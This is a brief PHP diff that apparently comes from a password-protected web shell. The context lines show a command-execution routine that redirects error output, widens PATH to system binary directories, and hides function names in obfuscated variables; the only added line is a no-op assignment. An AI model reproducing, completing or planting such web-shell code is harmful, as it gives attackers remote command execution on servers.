@@ -27,6 +27,7 @@ function main($command,$pass){
         $command = $command . " 2>&1\n";
     } else {
         @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
+        $command = $command;
     }
     $JueQDBH = 'is_callable';
     $Bvce = 'in_array';
